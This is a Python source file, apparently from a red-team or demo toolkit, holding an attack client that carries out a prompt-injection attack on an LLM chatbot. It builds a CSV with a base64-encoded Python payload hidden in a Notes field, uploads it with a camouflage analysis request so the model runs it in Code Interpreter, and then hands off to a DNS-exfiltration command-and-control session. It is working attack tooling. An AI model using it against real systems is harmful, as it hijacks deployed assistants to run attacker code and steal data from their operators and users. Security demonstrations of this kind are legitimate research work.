"""HTTP client for sending prompt injection attacks to victim chatbot."""

import os
import tempfile
from typing import Optional

import click
import requests

from .config import get_config
from .payload_generator import generate_malicious_csv, generate_session_id


class AttackClient:
    """
    HTTP client for sending prompt injection payloads to victim chatbot.

    This class encapsulates the attack workflow:
    1. Generate malicious CSV with embedded C2 payload
    2. Send to victim's /analyze/csv endpoint
    3. Track session for C2 interaction
    """

    def __init__(
        self,
        target_url: str,
        c2_domain: str = None,
        verbose: bool = False,
        narrate: bool = False,
    ):
        """
        Initialize the attack client.

        Args:
            target_url: Victim chatbot URL (e.g., https://chatbot.victim.com)
            c2_domain: C2 server domain (from config if not specified)
            verbose: Enable verbose output
            narrate: Print step-by-step explanations for demo audiences
        """
        config = get_config()
        self.target_url = target_url.rstrip("/")
        self.c2_domain = c2_domain or config.domain
        self.verbose = verbose
        self.narrate = narrate
        self.session_id = None

    def log(self, message: str, level: str = "info") -> None:
        """Log a message with optional verbosity control."""
        prefixes = {
            "info": "[*]",
            "success": "[+]",
            "error": "[-]",
            "warning": "[!]",
            "debug": "[D]",
        }
        prefix = prefixes.get(level, "[*]")

        if level == "debug" and not self.verbose:
            return

        click.echo(f"{prefix} {message}")

    def _narrate_msg(self, message: str) -> None:
        """Print a narration line for demo audiences. Only shown with --narrate."""
        if self.narrate:
            click.echo(f"[~] {message}")

    def generate_payload(self, output_path: str = None) -> str:
        """
        Generate malicious CSV with embedded payload.

        Args:
            output_path: Optional path for CSV file

        Returns:
            Path to generated CSV file
        """
        if output_path is None:
            fd, output_path = tempfile.mkstemp(suffix=".csv", prefix="attack_")
            os.close(fd)

        self.session_id = generate_session_id()

        generate_malicious_csv(
            c2_domain=self.c2_domain,
            session_id=self.session_id,
            output_path=output_path,
            injection_row=3,
            injection_style="technical",
        )

        self.log(f"Generated payload: {output_path}", "success")
        self.log(f"Session ID: {self.session_id}", "info")

        return output_path

    def send_attack(
        self,
        csv_path: str,
        message: str = "Please analyze the revenue by customer and show me the top performers",
        timeout: int = 10,
    ) -> dict:
        """
        Send malicious CSV to victim's analyze endpoint.

        We use a short timeout (default 10s) because we only need the server
        to *receive* the CSV. Code Interpreter takes much longer to execute
        the payload, so the ALB will typically return 504 or the request will
        time out — both mean the payload was delivered successfully.

        Args:
            csv_path: Path to malicious CSV file
            message: Analysis request message (camouflage)
            timeout: Request timeout in seconds

        Returns:
            Dict with status and response info
        """
        url = f"{self.target_url}/analyze/csv"

        self.log(f"Target URL: {url}", "info")
        self.log("Sending payload...", "info")

        try:
            with open(csv_path, "rb") as f:
                files = {"file": ("customer_analysis.csv", f, "text/csv")}
                data = {"message": message}

                response = requests.post(url, files=files, data=data, timeout=timeout)

            if response.status_code == 200:
                result = response.json()
                self.log("Payload delivered!", "success")
                self.log(
                    f"Response preview: {str(result.get('response', ''))[:200]}...",
                    "debug",
                )

                return {
                    "status": "success",
                    "session_id": self.session_id,
                    "response": result,
                }

            elif response.status_code in (502, 504):
                # 502/504 from ALB means the server received the request but
                # Code Interpreter is still executing. This is expected.
                self.log(
                    "Payload delivered! Server is processing (ALB timed out, this is normal).",
                    "success",
                )
                return {
                    "status": "success",
                    "session_id": self.session_id,
                    "message": "Payload delivered, Code Interpreter is executing",
                }

            else:
                self.log(f"HTTP {response.status_code}: {response.text[:200]}", "error")
                return {
                    "status": "error",
                    "session_id": self.session_id,
                    "error": f"HTTP {response.status_code}",
                    "detail": response.text[:500],
                }

        except requests.exceptions.Timeout:
            # Timeout means the server received the request and is processing.
            # The payload is executing in Code Interpreter.
            self.log(
                "Payload delivered! Server is processing (request timed out, this is normal).",
                "success",
            )
            return {
                "status": "success",
                "session_id": self.session_id,
                "message": "Payload delivered, Code Interpreter is executing",
            }

        except requests.exceptions.ConnectionError as e:
            self.log(f"Connection error: {e}", "error")
            return {
                "status": "connection_error",
                "session_id": self.session_id,
                "error": str(e),
            }

        except Exception as e:
            self.log(f"Unexpected error: {e}", "error")
            return {
                "status": "error",
                "session_id": self.session_id,
                "error": str(e),
            }

    def run_full_attack(self, message: str = None) -> str:
        """
        Execute full attack workflow.

        Args:
            message: Optional custom analysis message

        Returns:
            Session ID for C2 interaction
        """
        click.echo("\n" + "=" * 70)
        click.echo("  PROMPT INJECTION ATTACK - DNS EXFILTRATION")
        click.echo("=" * 70)

        click.echo(f"\n  Target:     {self.target_url}")
        click.echo(f"  C2 Domain:  {self.c2_domain}")
        click.echo()

        # Step 1: Generate payload
        click.echo("-" * 70)
        click.echo("  STEP 1: Generate malicious CSV")
        click.echo("-" * 70)
        self._narrate_msg("Generating malicious CSV with embedded prompt injection...")
        csv_path = self.generate_payload()
        self._narrate_msg(
            "CSV contains a base64-encoded Python payload in the Notes field of row 3"
        )

        # Step 2: Send to victim
        click.echo()
        click.echo("-" * 70)
        click.echo("  STEP 2: Send to victim chatbot")
        click.echo("-" * 70)
        self._narrate_msg(
            "Sending CSV to victim chatbot — the LLM will read it and execute the payload"
        )

        if message is None:
            message = "Please analyze the revenue data and show me the top 10 customers by total revenue."

        result = self.send_attack(csv_path, message)

        # Step 3: Report results
        click.echo()
        click.echo("-" * 70)
        click.echo("  RESULT")
        click.echo("-" * 70)

        if result["status"] == "success":
            click.echo("\n  [SUCCESS] Payload delivered!")
            self._narrate_msg(
                "The payload runs inside a Code Interpreter sandbox with only DNS access"
            )
        else:
            click.echo(f"\n  [FAILED] {result.get('error', 'Unknown error')}")
            click.echo(
                "  The payload was NOT delivered. Check the target URL and try again."
            )

        click.echo(f"\n  Session ID: {self.session_id}")

        # Cleanup temp file
        try:
            os.unlink(csv_path)
        except:
            pass

        click.echo()
        click.echo("=" * 70)
        click.echo("  NEXT STEPS")
        click.echo("=" * 70)
        click.echo(
            f"""
  The payload is now running in the victim's Code Interpreter.
  Connect to the C2 session to send commands:

    make connect-session

  Session ID: {self.session_id}
"""
        )
        click.echo("=" * 70 + "\n")

        return self.session_id
